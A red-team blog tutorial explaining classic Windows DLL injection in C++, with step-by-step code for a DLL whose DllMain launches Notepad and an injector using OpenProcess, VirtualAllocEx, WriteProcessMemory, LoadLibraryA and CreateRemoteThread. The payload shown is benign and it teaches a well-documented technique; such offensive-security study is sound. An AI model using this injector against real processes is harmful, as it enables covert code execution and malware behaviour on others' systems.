---
title: Offensive C++ - Process Injection - DLL Injection
author: nirajkharel
date: 2024-07-05 15:10:00 +0800
categories: [Red Teaming, Offensive Programming]
tags: [Red Teaming, Offensive Programming]
render_with_liquid: false
---


## Process Injection - DLL Injection
DLL Injection is a kind of process injection techniques but unlike loading shellcode into a running process, DLL Injection involves injecting and loading a malicious DLL into the running process.

**What is DLL?**    
Think of it as libraries needed to run a program. These libraries can be used by different programs at the same time. But in order to use such libraries/DLL/modules, a program needs to have them imported while compiling their code. When the DLL is loaded, it will execute the main function within the DLL, which is **DllMain**. Here in the image below, we can see the list of modules/DLLs that a program can have, for example, for `Calc.exe`.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-dll-inject-2.png">

Or, you can go through the [blog](https://nirajkharel.com.np/posts/process-module-enumeration/) I wrote before to enumerate the loaded DLLs/modules in the running process.

As we discussed earlier, `DllMain` serves as the entry point function for each loaded DLL. Let's explore what `DllMain` is and how we can create our own malicious DLL:
- On Microsoft Visual Code Studio, create a new project and select **Dynamic-Link Library** as the project type.
- Open the project, and you will be presented with default code for the DLL.


```c++
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

In the code above, we can see that it contains a `DllMain` function which has three different parameters:

- **HMODULE hModule**: Handle to the DLL module.
- **DWORD ul_reason_for_call**: Reason for calling the function. It contains different cases like `DLL_PROCESS_ATTACH`, `DLL_THREAD_ATTACH`, `DLL_THREAD_DETACH`, and `DLL_PROCESS_DETACH`. It performs actions based on the reason for calling. For example, the case `DLL_PROCESS_ATTACH` is executed when the DLL is loaded into the address space of the process.
- **LPVOID lpReserved**: Reserved for future use and is typically `NULL`.

If we want to execute malicious code or run any program within the process through our malicious DLL, we need to place that code inside the `DLL_PROCESS_ATTACH` case. For example, to simply open `Notepad.exe` through this DLL, we can use `CreateProcess` inside the `DllMain` function.

```c++
#include "pch.h"
#include <windows.h>
#pragma comment(lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  nReason, LPVOID lpReserved) {
    switch (nReason) {
    case DLL_PROCESS_ATTACH:
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Create the calculator process
        if (CreateProcess(
            L"C:\\Windows\\System32\\Notepad.exe", // Application name
            NULL,    // Command line arguments
            NULL,    // Process handle not inheritable
            NULL,    // Thread handle not inheritable
            FALSE,   // Set handle inheritance to FALSE
            0,       // No creation flags
            NULL,    // Use parent's environment block
            NULL,    // Use parent's starting directory 
            &si,     // Pointer to STARTUPINFO structure
            &pi)     // Pointer to PROCESS_INFORMATION structure
            ) {
            // Close process and thread handles. 
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

```

I would also recommend you watch the video **[Everything You Ever Wanted to Know about DLLs](https://www.youtube.com/watch?v=JPQWQfDhICA&t=1749s)** on YouTube. It explains pretty much everything you need to know.

Compile the code and execute the DLL using **rundll32.exe**. You should see that the DLL file has been loaded successfully and that `Notepad.exe` has been opened, which means the `CreateProcess` function inside `DllMain` has been executed.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-dll-inject-4.png">

Now that we have our malicious DLL ready, let’s go through the process of injecting it into a running process.

With our malicious DLL compiled, we first create a handle to the target process using **OpenProcess**. We then use that handle to allocate virtual address space in the memory of the running process with **VirtualAllocEx** and write the path of the DLL file into this memory using **WriteProcessMemory**.

Once that is done, we need to load the DLL into memory. We have written the DLL path into the memory using **WriteProcessMemory**, and now we use **CreateRemoteThread** to execute the **LoadLibrary** API. This will load the DLL specified by the path on the buffer address into the target process. **CreateRemoteThread** provides a handle to the newly created thread, which executes the DLL loading function.

By doing this, we successfully inject the DLL into the running process.


<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-dll-inject.png">

### Headers and Arguments
Let's first defined the needed headers and the argument that we need to pass it on. Here we will pass the process Id as an argument and DLL file will be defined within code itself.
```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char injectDLL[] = "C:\\Users\\theni\\source\\repos\\DLLInjection\\ARM64\\Debug\\DLLInjection.dll";
unsigned int dllLength = sizeof(injectDLL) + 1;

int main(int argc, char* argv[]) {


    // parse process ID
    if (atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    printf("PID: %i", atoi(argv[1]));
```

### OpenProcess
After identifying the process ID we want to inject into, the next step is to open a handle to the process using the OpenProcess function. I have detailed this function in a [blog post](https://nirajkharel.com.np/posts/process-module-enumeration/#openprocess). It is crucial to provide the necessary permissions: PROCESS_VM_WRITE, PROCESS_VM_OPERATION, and PROCESS_CREATE_THREAD, as we need to access the address, write into the memory, and execute a remote thread.


```c++
 HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, DWORD(atoi(argv[1])));
 if (hProcess == NULL) {
     printf("Error opening handle to the process, %u\n", GetLastError());
     return 1;
 }

 printf("Successfully Opened Handle to the Process\n");
```

### VirtualAllocEx
We need to allocate our buffer in the virtual address space of the running process. Before doing that, we must allocate or reserve a region of memory within the virtual address space. This can be done using the **VirtualAllocEx** function of the Windows API. I have already described this [in detail here](https://nirajkharel.com.np/posts/process-injection-shellcode/#buffer-allocation---virtualallocex).


```c++

    // allocate memory buffer for remote process
    LPVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dllLength, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (lpAlloc == NULL) {
        printf("Error Allocating memory to the process, %u\n", GetLastError());
        return 1;
    }
    printf("Successfully Allocated memory to the Process\n");
```

### WriteProcessMemory
Once we have allocated memory in the virtual address space, the next task is to write the DLL path into that memory. This was also explained in detail in [a previous blog post](https://nirajkharel.com.np/posts/process-injection-shellcode/#write-buffer-into-the-allocated-memory---writeprocessmemory).
```c++
 // "copy" evil DLL between processes
 BOOL bWrite = WriteProcessMemory(hProcess, lpAlloc, injectDLL, dllLength, NULL);
 if (bWrite == NULL) {
     printf("Error writing DLL to the process, %u\n", GetLastError());
     return 1;
 }
 printf("Successfully copied DLL into the Process\n");
```

### LoadLibrary
While injecting shellcode into the running process, we directly wrote our shellcode into the allocated memory address. However, DLLs do not work that way. As described in the image above, it needs to be done through the **LoadLibraryA** function, which loads the specified DLL into the address space of the calling process. Keep in mind that writing the DLL path into the memory address and loading the DLL into the memory address are two different things.

The **LoadLibraryA** function is part of the Kernel32.dll APIs. In order to use it, we need to get a handle to Kernel32.dll first using **GetModuleHandle**. This function takes a single parameter, which is the name of the DLL/module for which the handle needs to be obtained.

Once we have a handle to Kernel32.dll, we need to access the address of **LoadLibraryA** from Kernel32.dll. This is done using the **GetProcAddress** function. It takes two parameters: the first one is a handle to the module, and the second one is the name of the function we need to use, derived from the module to which the handle is opened.


```c++
// Load kernel32.dll in the current process
HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");

// Get the address of LoadLibraryA from kernel32.dll
FARPROC loadLibAddress = GetProcAddress(hKernel32, "LoadLibraryA");
```

Then, if we need to implement **LoadLibraryA** to load the DLL, why was **WriteProcessMemory** even needed? The answer is described in the paragraph below.

### CreateRemoteThread
Understand this method as the way to create a specific thread inside our target process in order to load and execute our DLL. We will not discuss every parameter needed for the **CreateRemoteThread** function here, as we have already discussed them in the [previous blog](https://nirajkharel.com.np/posts/process-injection-shellcode/#execute-the-shellcode---createremotethreadex). The only differences are the fourth and fifth parameters, which we will discuss below:

- **LPTHREAD_START_ROUTINE lpStartAddress**: Defines the start address of the allocated memory, but Microsoft requires this to be an application-defined function of type `LPTHREAD_START_ROUTINE`. This `LPTHREAD_START_ROUTINE` is what will provide the starting address for the thread and is documented under [ThreadProc](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms686736(v=vs.85)?redirectedfrom=MSDN). We discussed earlier that the thread can execute any portion of the memory in the process, but it's obvious that we need to instruct the thread which portion to execute. This can be done by that routine. Since we need our thread to start executing from the starting portion of the allocated memory, the value for it will be `(LPTHREAD_START_ROUTINE)loadLibAddress`.

    **Why LoadLibrary is implemented here?**: The **LoadLibrary** function is implemented to load the DLL into the address space of the target process. By specifying **LoadLibrary** as the start address, the thread will begin execution by calling this function, ensuring that the DLL is properly loaded into the target process.

- **LPVOID lpParameter**: If we want to pass a variable to the thread, we need to pass the pointer to the variable, which will be the allocated memory `lpAlloc`.

    **Reason for giving `lpAlloc` as the parameter**: The `lpAlloc` memory contains the path of the DLL that we want to load. By passing `lpAlloc` as the parameter to **LoadLibrary**, we provide the necessary path information that **LoadLibrary** needs to locate and load the DLL. This is why **WriteProcessMemory** was used earlier: to place the DLL path in the target process's memory so that **LoadLibrary** can access it.

When we configure these two arguments, **CreateRemoteThread** will execute the **LoadLibrary** function, and **LoadLibrary** will take the parameter from `lpAlloc`, which contains the file path of the DLL. This file path was written by the **WriteProcessMemory** function.

```c++
HMODULE LoadLibraryA(
  [in] LPCSTR lpLibFileName
);
```

That makes our CreateRemoteThread as:

```c++

// Needed parameter for CreateRemoteThread
LPTHREAD_START_ROUTINE threadStartRoutineAddress = (LPTHREAD_START_ROUTINE)loadLibAddress;

// Start new thread on the process
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, threadStartRoutineAddress, lpAlloc, 0, NULL);
if (hThread == NULL) {
    printf("Error injecting DLL into the process, %u\n", GetLastError());
    return 1;
}
printf("Successfully injected DLL into the Process\n");
```

### WaitForSingleObject and CloseHandle
Wait for the thread to finish and close the handles to the thread and process. Please refer to [this blog](https://nirajkharel.com.np/posts/process-injection-shellcode/#waitforsingleobject) for more details regarding this.
```c++
waitForSingleObject(hThread, INFINITE);

CloseHandle(hThread);
CloseHandle(hProcess);
return 0;
}
```

Find the full [source code here:](https://github.com/nirajkharel/OffensiveProgramming/blob/main/DLL-Injection-C%2B%2B.cpp)


<br>
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-dll-injection.gif">
<br>

### References
- [https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- [https://medium.com/@0xey/t1055-001-process-injection-dll-injection-64dc14719faa](https://medium.com/@0xey/t1055-001-process-injection-dll-injection-64dc14719faa)
- [https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection](https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection)
- [https://pentestlab.blog/2017/04/04/dll-injection/](https://pentestlab.blog/2017/04/04/dll-injection/)
- [https://www.youtube.com/watch?v=JPQWQfDhICA&t=1749s](https://www.youtube.com/watch?v=JPQWQfDhICA&t=1749s)
- [https://www.youtube.com/watch?v=ilRJRkMyzlA](https://www.youtube.com/watch?v=ilRJRkMyzlA)
- [https://www.youtube.com/watch?v=QWufdv3Y8Gw](https://www.youtube.com/watch?v=QWufdv3Y8Gw)
- [https://www.youtube.com/watch?v=0jX9UoXYLa4](https://www.youtube.com/watch?v=0jX9UoXYLa4)